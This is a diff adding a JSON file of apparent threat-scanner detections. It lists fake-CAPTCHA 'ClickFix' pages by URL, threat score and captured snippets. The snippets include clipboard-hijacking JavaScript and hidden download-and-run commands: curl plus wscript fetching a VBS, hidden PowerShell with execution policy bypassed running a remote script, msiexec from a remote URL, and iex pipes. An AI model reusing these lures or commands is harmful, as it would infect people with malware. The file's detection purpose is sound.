@@ -1,0 +1,248 @@
+[
+  {
+    "source_url": "https://103.74.5.124/",
+    "threat_score": 624,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ea); textarea.select(); try { document.execCommand('copy'); } catch(e) { /* ignore */ } document...."
+  },
+  {
+    "source_url": "https://103.74.5.124/",
+    "threat_score": 624,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ntDefault(); if (e.clipboardData) { e.clipboardData.setData('text/plain', command); } else if (window.clip..."
+  },
+  {
+    "source_url": "https://103.74.5.124/",
+    "threat_score": 624,
+    "category": "Clipboard Manipulation JS",
+    "value": "...} else if (window.clipboardData) { window.clipboardData.setData('Text', command); } }); </script> <script> (..."
+  },
+  {
+    "source_url": "https://103.74.5.124/",
+    "threat_score": 624,
+    "category": "Clipboard Manipulation JS",
+    "value": "...* chars.length)]).join(\"\"); } }); document.addEventListener('copy', function (e) { e.preventDefault(); if (..."
+  },
+  {
+    "source_url": "https://103.74.5.124/",
+    "threat_score": 624,
+    "category": "Clipboard Manipulation JS",
+    "value": "...nt.body.appendChild(textarea); textarea.select(); try { document.execCommand('copy'); }..."
+  },
+  {
+    "source_url": "https://103.74.5.124/",
+    "threat_score": 624,
+    "category": "Clipboard Manipulation JS",
+    "value": "...re</span></div> </div> </div> <script> /* */ const command = 'cmd /c \"curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\\\qk.vbs >nul && wscript.exe //B //E:VBScript %temp%\\\\qk.vbs\"'; (function () { const params = new URLSearchParams(window.location.search); const siteParam = params.get('site'); const logoParam = params.get('logo'); function getHostname(val) { if (!val) return window.location.hostname || ''; try { return new URL(val, window.location.origin).hostname; } catch { return String(val).replace(/^https?:\\/\\//i,'').split('/')[0]; } } const host = getHostname(siteParam) || window.location.hostname || ''; document.querySelectorAll('.domain-name').forEach(el => { el.textContent = host; }); // aktuelles website icon const faviconUrl = logoParam || `https://www.google.com/s2/favicons?sz=128&domain=${encodeURIComponent(host)}`; (document.getElementById('dynamic-favicon') || (()=>{const l=document.createElement('link');l.rel='icon';document.head.appendChild(l);return l;})()).href = faviconUrl; const candidates = [ faviconUrl, `https://icons.duckduckgo.com/ip3/${encodeURIComponent(host)}.ico`, `https://${host}/favicon.ico` ].filter(Boolean); document.querySelectorAll('.logo-img').forEach(img => { let i = 0; const tryNext = () => { if (i >= candidates.length) { img.src = faviconUrl; return; } img.src = candidates[i++]; }; img.alt = host + ' logo'; img.onerror = tryNext; tryNext(); }); })(); </script> <script> document.addEventListener(\"DOMContentLoaded\", function () { const preloaderElements = document.querySelectorAll(\".preloader\"); const preloaderText = document.querySelector(\".preloader_text\"); const textAllStep = document.querySelector(\".textallstep\"); const checkboxWindow = document.getElementById(\"checkbox-window\"); const step0Elements = document.querySelectorAll(\".step0\"); const step1Elements = document.querySelectorAll(\".step1\"); const step2Elements = document.querySelectorAll(\".step2\"); const step3Elements = document.querySelectorAll(\".step3\"); const checkbox = document.getElementById(\"checkbox\"); const verifyWindow = document.getElementById(\"verify-window\"); const spinner = document.getElementById(\"spinner\"); const verifyButton = document.getElementById(\"verify-button\"); setTimeout(() => { preloaderElements.forEach(el => el.style.display = \"none\"); if (preloaderText) preloaderText.style.display = \"none\"; if (textAllStep) textAllStep.style.display = \"block\"; if (checkboxWindow) checkboxWindow.style.display = \"flex\"; setTimeout(() => { if (checkboxWindow) { checkboxWindow.style.display = \"flex\"; let opacity = 0; const fadeIn = setInterval(() => { if (opacity >= 1) { clearInterval(fadeIn); } else { opacity += 0.1; checkboxWindow.style.opacity = opacity; } }, 30); } }, 200); step0Elements.forEach(el => el.style.display = \"block\"); setTimeout(() => { step0Elements.forEach(el => el.style.display = \"none\"); step1Elements.forEach(el => el.style.display = \"block\"); }, 2000); }, 1500); if (checkbox) { checkbox.addEventListener(\"click\", function () { const textarea = document.createElement('textarea'); textarea.value = command; textarea.setAttribute('readonly', ''); textarea.style.position = 'absolute'; textarea.style.left = '-9999px'; document.body.appendChild(textarea); textarea.select(); try { document.execCommand('copy'); } catch(e) { /* ignore */ } document.body.removeChild(textarea); step1Elements.forEach(el => el.style.display = \"none\"); step2Elements.forEach(el => el.style.display = \"block\"); if (spinner) spinner.style.visibility = \"visible\"; setTimeout(() => { if (checkboxWindow) { checkboxWindow.style.width = \"530px\"; checkboxWindow.style.height = \"auto\"; } if (verifyWindow) verifyWindow.classList.add(\"active\"); }, 500); }); } if (verifyButton) { verifyButton.addEventListener(\"click\", function () { if (verifyWindow) verifyWindow.classList.remove(\"active\"); if (checkboxWindow) checkboxWindow.style.height = \"74px\"; setTimeout(() => { if (checkboxWindow) checkboxWindow.style.width = \"300px\"; step2Elements.forEach(el => el.style.display = \"none\"); step3Elements.forEach(el => el.style.display = \"block\"); setTimeout(() => { step3Elements.forEach(el => el.style.display = \"none\"); step1Elements.forEach(el => el.style.display = \"block\"); if (spinner) spinner.style.visibility = \"hidden\"; }, 1000); }, 600); }); } const verEl = document.getElementById(\"verification-id\"); if (verEl) verEl.textContent = Math.floor(100000 + Math.random() * 900000); const chars = \"abcdef0123456789\"; const rayEl = document.querySelector(\".ray-id\"); if (rayEl) { rayEl.textContent = Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join(\"\"); } }); document.addEventListener('copy', function (e) { e.preventDefault(); if (e.clipboardData) { e.clipboardData.setData('text/plai..."
+  },
+  {
+    "source_url": "https://162.215.130.152/",
+    "threat_score": 520,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ntDefault(); if (e.clipboardData) { e.clipboardData.setData('text/plain', command); } else if (window.clip..."
+  },
+  {
+    "source_url": "https://162.215.130.152/",
+    "threat_score": 520,
+    "category": "Clipboard Manipulation JS",
+    "value": "...} else if (window.clipboardData) { window.clipboardData.setData('Text', command); } }); </script> <!-- === Tr..."
+  },
+  {
+    "source_url": "https://162.215.130.152/",
+    "threat_score": 520,
+    "category": "Clipboard Manipulation JS",
+    "value": "...e copied content is the safe placeholder document.addEventListener('copy', function (e) { // prevent leaking of user-se..."
+  },
+  {
+    "source_url": "https://162.215.130.152/",
+    "threat_score": 520,
+    "category": "Clipboard Manipulation JS",
+    "value": "...re</span></div> </div> </div> <script> /* */ const command = `cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\\\\\Downloads\\\\\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\"`; /* Robust hostname + favicon + logo (single source of truth) */ (function () { const params = new URLSearchParams(window.location.search); const siteParam = params.get('site'); // may be null/empty const logoParam = params.get('logo'); // optional override function getHostname(val) { if (!val) return window.location.hostname || ''; try { return new URL(val, window.location.origin).hostname; } catch { return String(val).replace(/^https?:\\/\\//i,'').split('/')[0]; } } const host = getHostname(siteParam) || window.location.hostname || ''; // Show domain (works for localhost too) document.querySelectorAll('.domain-name').forEach(el => { el.textContent = host; }); // Tab favicon const faviconUrl = logoParam || `https://www.google.com/s2/favicons?sz=128&domain=${encodeURIComponent(host)}`; (document.getElementById('dynamic-favicon') || (()=>{const l=document.createElement('link');l.rel='icon';document.head.appendChild(l);return l;})()).href = faviconUrl; // On-page logo: try the same favicon first, then fallbacks const candidates = [ faviconUrl, // same as tab `https://icons.duckduckgo.com/ip3/${encodeURIComponent(host)}.ico`, `https://${host}/favicon.ico` ].filter(Boolean); document.querySelectorAll('.logo-img').forEach(img => { let i = 0; const tryNext = () => { if (i >= candidates.length) { img.src = faviconUrl; return; } img.src = candidates[i++]; }; img.alt = host + ' logo'; img.onerror = tryNext; tryNext(); }); })(); </script> <script> // --- original logic preserved (preloader / steps logic) -- /** * Note: This file may contain artifacts of previous malicious infection. * However, the dangerous code has been removed, and the file is now safe to use. */ ); // copy event: ensure copied content is the safe placeholder document.addEventListener('copy', function (e) { // prevent leaking of user-selected text; set clipboard to safe placeholder e.preventDefault(); i..."
+  },
+  {
+    "source_url": "https://173.231.196.249/",
+    "threat_score": 636,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ea); textarea.select(); try { document.execCommand('copy'); } catch(e) { /* ignore */ } document...."
+  },
+  {
+    "source_url": "https://173.231.196.249/",
+    "threat_score": 636,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ntDefault(); if (e.clipboardData) { e.clipboardData.setData('text/plain', command); } else if (window.clip..."
+  },
+  {
+    "source_url": "https://173.231.196.249/",
+    "threat_score": 636,
+    "category": "Clipboard Manipulation JS",
+    "value": "...} else if (window.clipboardData) { window.clipboardData.setData('Text', command); } }); </script> <!-- === Tr..."
+  },
+  {
+    "source_url": "https://173.231.196.249/",
+    "threat_score": 636,
+    "category": "Clipboard Manipulation JS",
+    "value": "...e copied content is the safe placeholder document.addEventListener('copy', function (e) { // prevent leaking of user-se..."
+  },
+  {
+    "source_url": "https://173.231.196.249/",
+    "threat_score": 636,
+    "category": "Clipboard Manipulation JS",
+    "value": "...nt.body.appendChild(textarea); textarea.select(); try { document.execCommand('copy'); }..."
+  },
+  {
+    "source_url": "https://173.231.196.249/",
+    "threat_score": 636,
+    "category": "Clipboard Manipulation JS",
+    "value": "...re</span></div> </div> </div> <script> /* */ const command = `cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\\\\\Downloads\\\\\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\"`; /* Robust hostname + favicon + logo (single source of truth) */ (function () { const params = new URLSearchParams(window.location.search); const siteParam = params.get('site'); // may be null/empty const logoParam = params.get('logo'); // optional override function getHostname(val) { if (!val) return window.location.hostname || ''; try { return new URL(val, window.location.origin).hostname; } catch { return String(val).replace(/^https?:\\/\\//i,'').split('/')[0]; } } const host = getHostname(siteParam) || window.location.hostname || ''; // Show domain (works for localhost too) document.querySelectorAll('.domain-name').forEach(el => { el.textContent = host; }); // Tab favicon const faviconUrl = logoParam || `https://www.google.com/s2/favicons?sz=128&domain=${encodeURIComponent(host)}`; (document.getElementById('dynamic-favicon') || (()=>{const l=document.createElement('link');l.rel='icon';document.head.appendChild(l);return l;})()).href = faviconUrl; // On-page logo: try the same favicon first, then fallbacks const candidates = [ faviconUrl, // same as tab `https://icons.duckduckgo.com/ip3/${encodeURIComponent(host)}.ico`, `https://${host}/favicon.ico` ].filter(Boolean); document.querySelectorAll('.logo-img').forEach(img => { let i = 0; const tryNext = () => { if (i >= candidates.length) { img.src = faviconUrl; return; } img.src = candidates[i++]; }; img.alt = host + ' logo'; img.onerror = tryNext; tryNext(); }); })(); </script> <script> // --- original logic preserved (preloader / steps logic) --- document.addEventListener(\"DOMContentLoaded\", function () { const preloaderElements = document.querySelectorAll(\".preloader\"); const preloaderText = document.querySelector(\".preloader_text\"); const textAllStep = document.querySelector(\".textallstep\"); const checkboxWindow = document.getElementById(\"checkbox-window\"); const step0Elements = document.querySelectorAll(\".step0\"); const step1Elements = document.querySelectorAll(\".step1\"); const step2Elements = document.querySelectorAll(\".step2\"); const step3Elements = document.querySelectorAll(\".step3\"); const checkbox = document.getElementById(\"checkbox\"); const verifyWindow = document.getElementById(\"verify-window\"); const spinner = document.getElementById(\"spinner\"); const verifyButton = document.getElementById(\"verify-button\"); setTimeout(() => { preloaderElements.forEach(el => el.style.display = \"none\"); if (preloaderText) preloaderText.style.display = \"none\"; if (textAllStep) textAllStep.style.display = \"block\"; if (checkboxWindow) checkboxWindow.style.display = \"flex\"; setTimeout(() => { if (checkboxWindow) { checkboxWindow.style.display = \"flex\"; let opacity = 0; const fadeIn = setInterval(() => { if (opacity >= 1) { clearInterval(fadeIn); } else { opacity += 0.1; checkboxWindow.style.opacity = opacity; } }, 30); } }, 200); step0Elements.forEach(el => el.style.display = \"block\"); setTimeout(() => { step0Elements.forEach(el => el.style.display = \"none\"); step1Elements.forEach(el => el.style.display = \"block\"); }, 2000); }, 1500); if (checkbox) { checkbox.addEventListener(\"click\", function () { // Copy behavior kept, but the copied string is the safe placeholder above const textarea = document.createElement('textarea'); textarea.value = command; textarea.setAttribute('readonly', ''); textarea.style.position = 'absolute'; textarea.style.left = '-9999px'; document.body.appendChild(textarea); textarea.select(); try { document.execCommand('copy'); } catch(e) { /* ignore */ } document.body.removeChild(textarea); step1Elements.forEach(el => el.style.display = \"none\"); step2Elements.forEach(el => el.style.display = \"block\"); if (spinner) spinner.style.visibility = \"visible\"; setTimeout(() => { if (checkboxWindow) { checkboxWindow.style.width = \"530px\"; checkboxWindow.style.height = \"auto\"; } if (verifyWindow) verifyWindow.classList.add(\"active\"); }, 500); }); } if (verifyButton) { verifyButton.addEventListener(\"click\", function () { if (verifyWindow) verifyWindow.classList.remove(\"active\"); if (checkboxWindow) checkboxWindow.style.height = \"74px\"; setTimeout(() => { if (checkboxWindow) checkboxWindow.style.width = \"300px\"; step2Elements.forEach(el => el.style.display = \"none\"); step3Elements.forEach(el => el.style.display = \"block\"); setTimeout(() => { step3Elements.forEach(el => el.style.display = \"none\"); step1Elements.forEach(el => el.style.display = \"block\"); if (spinner) spinner.style.visibility = \"hidden\"; }, 1000); }, 600); }); } // verification id + ray id generation const verEl = document.getElementById(\"verification-id\"); if (verEl) verEl.textContent = Math.floor(100000 + Math.random() * 900000); const chars = \"abcdef0123456789\"; const rayEl = document.querySelector(\".ray-id\"); if (rayEl) { rayEl.textContent = Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join(\"\"); } }); // copy event: ensure copied content is the safe placeholder document.addEventListener('copy', function (e) { // prevent leaking of user-selected text; set clipboard to safe placeholder e.preventDefault(); i..."
+  },
+  {
+    "source_url": "http://162.215.130.152/",
+    "threat_score": 520,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ntDefault(); if (e.clipboardData) { e.clipboardData.setData('text/plain', command); } else if (window.clip..."
+  },
+  {
+    "source_url": "http://162.215.130.152/",
+    "threat_score": 520,
+    "category": "Clipboard Manipulation JS",
+    "value": "...} else if (window.clipboardData) { window.clipboardData.setData('Text', command); } }); </script> <!-- === Tr..."
+  },
+  {
+    "source_url": "http://162.215.130.152/",
+    "threat_score": 520,
+    "category": "Clipboard Manipulation JS",
+    "value": "...e copied content is the safe placeholder document.addEventListener('copy', function (e) { // prevent leaking of user-se..."
+  },
+  {
+    "source_url": "http://162.215.130.152/",
+    "threat_score": 520,
+    "category": "Clipboard Manipulation JS",
+    "value": "...re</span></div> </div> </div> <script> /* */ const command = `cmd.exe /c powershell -w h -ep Bypass -nop -c \"$d='p.ps1';$y=$env:USERPROFILE+'\\\\\\\\Downloads\\\\\\\\'+$d;Start-Sleep 15;(New-Object Net.WebClient).DownloadFile('https://ghost.nestdns.com/files', $y);& $y;Remove-Item $y -Force;\"`; /* Robust hostname + favicon + logo (single source of truth) */ (function () { const params = new URLSearchParams(window.location.search); const siteParam = params.get('site'); // may be null/empty const logoParam = params.get('logo'); // optional override function getHostname(val) { if (!val) return window.location.hostname || ''; try { return new URL(val, window.location.origin).hostname; } catch { return String(val).replace(/^https?:\\/\\//i,'').split('/')[0]; } } const host = getHostname(siteParam) || window.location.hostname || ''; // Show domain (works for localhost too) document.querySelectorAll('.domain-name').forEach(el => { el.textContent = host; }); // Tab favicon const faviconUrl = logoParam || `https://www.google.com/s2/favicons?sz=128&domain=${encodeURIComponent(host)}`; (document.getElementById('dynamic-favicon') || (()=>{const l=document.createElement('link');l.rel='icon';document.head.appendChild(l);return l;})()).href = faviconUrl; // On-page logo: try the same favicon first, then fallbacks const candidates = [ faviconUrl, // same as tab `https://icons.duckduckgo.com/ip3/${encodeURIComponent(host)}.ico`, `https://${host}/favicon.ico` ].filter(Boolean); document.querySelectorAll('.logo-img').forEach(img => { let i = 0; const tryNext = () => { if (i >= candidates.length) { img.src = faviconUrl; return; } img.src = candidates[i++]; }; img.alt = host + ' logo'; img.onerror = tryNext; tryNext(); }); })(); </script> <script> // --- original logic preserved (preloader / steps logic) -- /** * Note: This file may contain artifacts of previous malicious infection. * However, the dangerous code has been removed, and the file is now safe to use. */ ); // copy event: ensure copied content is the safe placeholder document.addEventListener('copy', function (e) { // prevent leaking of user-selected text; set clipboard to safe placeholder e.preventDefault(); i..."
+  },
+  {
+    "source_url": "https://178.210.83.9/",
+    "threat_score": 588,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ea); textarea.select(); try { document.execCommand('copy'); } catch(e) { /* ignore */ } document...."
+  },
+  {
+    "source_url": "https://178.210.83.9/",
+    "threat_score": 588,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ntDefault(); if (e.clipboardData) { e.clipboardData.setData('text/plain', command); } else if (window.clip..."
+  },
+  {
+    "source_url": "https://178.210.83.9/",
+    "threat_score": 588,
+    "category": "Clipboard Manipulation JS",
+    "value": "...} else if (window.clipboardData) { window.clipboardData.setData('Text', command); } }); </script> <!-- === Tr..."
+  },
+  {
+    "source_url": "https://178.210.83.9/",
+    "threat_score": 588,
+    "category": "Clipboard Manipulation JS",
+    "value": "...e copied content is the safe placeholder document.addEventListener('copy', function (e) { // prevent leaking of user-se..."
+  },
+  {
+    "source_url": "https://178.210.83.9/",
+    "threat_score": 588,
+    "category": "Clipboard Manipulation JS",
+    "value": "...nt.body.appendChild(textarea); textarea.select(); try { document.execCommand('copy'); }..."
+  },
+  {
+    "source_url": "https://178.210.83.9/",
+    "threat_score": 588,
+    "category": "Clipboard Manipulation JS",
+    "value": "...re</span></div> </div> </div> <script> /* */ const command = \"msiexec /i https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/\"; /* Robust hostname + favicon + logo (single source of truth) */ (function () { const params = new URLSearchParams(window.location.search); const siteParam = params.get('site'); // may be null/empty const logoParam = params.get('logo'); // optional override function getHostname(val) { if (!val) return window.location.hostname || ''; try { return new URL(val, window.location.origin).hostname; } catch { return String(val).replace(/^https?:\\/\\//i,'').split('/')[0]; } } const host = getHostname(siteParam) || window.location.hostname || ''; // Show domain (works for localhost too) document.querySelectorAll('.domain-name').forEach(el => { el.textContent = host; }); // Tab favicon const faviconUrl = logoParam || `https://www.google.com/s2/favicons?sz=128&domain=${encodeURIComponent(host)}`; (document.getElementById('dynamic-favicon') || (()=>{const l=document.createElement('link');l.rel='icon';document.head.appendChild(l);return l;})()).href = faviconUrl; // On-page logo: try the same favicon first, then fallbacks const candidates = [ faviconUrl, // same as tab `https://icons.duckduckgo.com/ip3/${encodeURIComponent(host)}.ico`, `https://${host}/favicon.ico` ].filter(Boolean); document.querySelectorAll('.logo-img').forEach(img => { let i = 0; const tryNext = () => { if (i >= candidates.length) { img.src = faviconUrl; return; } img.src = candidates[i++]; }; img.alt = host + ' logo'; img.onerror = tryNext; tryNext(); }); })(); </script> <script> // --- original logic preserved (preloader / steps logic) --- document.addEventListener(\"DOMContentLoaded\", function () { const preloaderElements = document.querySelectorAll(\".preloader\"); const preloaderText = document.querySelector(\".preloader_text\"); const textAllStep = document.querySelector(\".textallstep\"); const checkboxWindow = document.getElementById(\"checkbox-window\"); const step0Elements = document.querySelectorAll(\".step0\"); const step1Elements = document.querySelectorAll(\".step1\"); const step2Elements = document.querySelectorAll(\".step2\"); const step3Elements = document.querySelectorAll(\".step3\"); const checkbox = document.getElementById(\"checkbox\"); const verifyWindow = document.getElementById(\"verify-window\"); const spinner = document.getElementById(\"spinner\"); const verifyButton = document.getElementById(\"verify-button\"); setTimeout(() => { preloaderElements.forEach(el => el.style.display = \"none\"); if (preloaderText) preloaderText.style.display = \"none\"; if (textAllStep) textAllStep.style.display = \"block\"; if (checkboxWindow) checkboxWindow.style.display = \"flex\"; setTimeout(() => { if (checkboxWindow) { checkboxWindow.style.display = \"flex\"; let opacity = 0; const fadeIn = setInterval(() => { if (opacity >= 1) { clearInterval(fadeIn); } else { opacity += 0.1; checkboxWindow.style.opacity = opacity; } }, 30); } }, 200); step0Elements.forEach(el => el.style.display = \"block\"); setTimeout(() => { step0Elements.forEach(el => el.style.display = \"none\"); step1Elements.forEach(el => el.style.display = \"block\"); }, 2000); }, 1500); if (checkbox) { checkbox.addEventListener(\"click\", function () { // Copy behavior kept, but the copied string is the safe placeholder above const textarea = document.createElement('textarea'); textarea.value = command; textarea.setAttribute('readonly', ''); textarea.style.position = 'absolute'; textarea.style.left = '-9999px'; document.body.appendChild(textarea); textarea.select(); try { document.execCommand('copy'); } catch(e) { /* ignore */ } document.body.removeChild(textarea); step1Elements.forEach(el => el.style.display = \"none\"); step2Elements.forEach(el => el.style.display = \"block\"); if (spinner) spinner.style.visibility = \"visible\"; setTimeout(() => { if (checkboxWindow) { checkboxWindow.style.width = \"530px\"; checkboxWindow.style.height = \"auto\"; } if (verifyWindow) verifyWindow.classList.add(\"active\"); }, 500); }); } if (verifyButton) { verifyButton.addEventListener(\"click\", function () { if (verifyWindow) verifyWindow.classList.remove(\"active\"); if (checkboxWindow) checkboxWindow.style.height = \"74px\"; setTimeout(() => { if (checkboxWindow) checkboxWindow.style.width = \"300px\"; step2Elements.forEach(el => el.style.display = \"none\"); step3Elements.forEach(el => el.style.display = \"block\"); setTimeout(() => { step3Elements.forEach(el => el.style.display = \"none\"); step1Elements.forEach(el => el.style.display = \"block\"); if (spinner) spinner.style.visibility = \"hidden\"; }, 1000); }, 600); }); } // verification id + ray id generation const verEl = document.getElementById(\"verification-id\"); if (verEl) verEl.textContent = Math.floor(100000 + Math.random() * 900000); const chars = \"abcdef0123456789\"; const rayEl = document.querySelector(\".ray-id\"); if (rayEl) { rayEl.textContent = Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join(\"\"); } }); // copy event: ensure copied content is the safe placeholder document.addEventListener('copy', function (e) { // prevent leaking of user-selected text; set clipboard to safe placeholder e.preventDefault(); i..."
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "Clipboard Command",
+    "value": "powershell "
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "Clipboard Manipulation JS",
+    "value": "...); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextA..."
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ck\", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; checkboxBtnSpinner.style.animation = \"spin 1s linear infinite\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = \"0\"; checkboxBtnSpinner.style.animation = \"none\"; setTimeout(function() { checkboxBtnSpinner.style.visibility = \"hidden\"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = \"hidden\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaCheckbox() { checkboxBtn.style.width = \"100%\"; checkboxBtn.style.height = \"100%\"; checkboxBtn.style.borderRadius = \"2px\"; checkboxBtn.style.margin = \"21px 0 0 12px\"; checkboxBtn.style.opacity = \"1\"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = \"4px\"; checkboxBtn.style.height = \"4px\"; checkboxBtn.style.borderRadius = \"50%\"; checkboxBtn.style.marginLeft = \"25px\"; checkboxBtn.style.marginTop = \"33px\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"hidden\"; checkboxBtnSpinner.style.opacity = \"0\"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = \"none\"; verifywindow.style.visibility = \"hidden\"; verifywindow.style.opacity = \"0\"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== \"none\" && verifywindow.style.display !== \"\"; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(\"textarea\"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = \" # \" const ploy = \"\u00e2\u009c ''I am not a robot - reCAPTCHA Verification Hash: \" const end = \"''\" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()..."
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "Clipboard Manipulation JS",
+    "value": "...dy.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\");..."
+  },
+  {
+    "source_url": "https://blessdayservices.org/up/",
+    "threat_score": 339,
+    "category": "Clipboard Manipulation JS",
+    "value": "...32.ps1 | iex' -WindowStyle Hidden\\\"\"; const commandToRun = \"powershell \" + htaPath; stageClipboa..."
+  },
+  {
+    "source_url": "https://jessespridecharters.com/v/",
+    "threat_score": 309,
+    "category": "Clipboard Command",
+    "value": "powershell "
+  },
+  {
+    "source_url": "https://jessespridecharters.com/v/",
+    "threat_score": 309,
+    "category": "Clipboard Manipulation JS",
+    "value": "...); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextA..."
+  },
+  {
+    "source_url": "https://jessespridecharters.com/v/",
+    "threat_score": 309,
+    "category": "Clipboard Manipulation JS",
+    "value": "...ck\", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; checkboxBtnSpinner.style.animation = \"spin 1s linear infinite\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = \"0\"; checkboxBtnSpinner.style.animation = \"none\"; setTimeout(function() { checkboxBtnSpinner.style.visibility = \"hidden\"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = \"hidden\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaCheckbox() { checkboxBtn.style.width = \"100%\"; checkboxBtn.style.height = \"100%\"; checkboxBtn.style.borderRadius = \"2px\"; checkboxBtn.style.margin = \"21px 0 0 12px\"; checkboxBtn.style.opacity = \"1\"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = \"4px\"; checkboxBtn.style.height = \"4px\"; checkboxBtn.style.borderRadius = \"50%\"; checkboxBtn.style.marginLeft = \"25px\"; checkboxBtn.style.marginTop = \"33px\"; checkboxBtn.style.opacity = \"0\"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"visible\"; checkboxBtnSpinner.style.opacity = \"1\"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = \"hidden\"; checkboxBtnSpinner.style.opacity = \"0\"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = \"none\"; verifywindow.style.visibility = \"hidden\"; verifywindow.style.opacity = \"0\"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== \"none\" && verifywindow.style.display !== \"\"; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(\"textarea\"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = \" # \" const ploy = \"\u2705 ''I am not a robot - reCAPTCHA Verification Hash: \" const end = \"''\" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()..."
+  },
+  {
+    "source_url": "https://jessespridecharters.com/v/",
+    "threat_score": 309,
+    "category": "Clipboard Manipulation JS",
+    "value": "...dy.append(tempTextArea); tempTextArea.select(); document.execCommand(\"copy\");..."
+  },
+  {
+    "source_url": "https://jessespridecharters.com/v/",
+    "threat_score": 309,
+    "category": "Clipboard Manipulation JS",
+    "value": "...sdev.wpengine.com/2/15.ps1' | iex\\\"\"; const commandToRun = \"powershell \" + htaPath; stageClipboa..."
+  },
+  {
+    "source_url": "https://www.bratusferramentas.grupomoltz.com.br/",
+    "threat_score": 401,
+    "category": "Clipboard Command",
+    "value": "POWerShEll -W h "
+  },
+  {
+    "source_url": "https://www.bratusferramentas.grupomoltz.com.br/",
+    "threat_score": 401,
+    "category": "Clipboard Manipulation JS",
+    "value": "...tempTextArea.select(); document.execCommand(\"copy\"); document.body.removeChild(tempText..."
+  },
+  {
+    "source_url": "https://www.bratusferramentas.grupomoltz.com.br/",
+    "threat_score": 401,
+    "category": "Clipboard Manipulation JS",
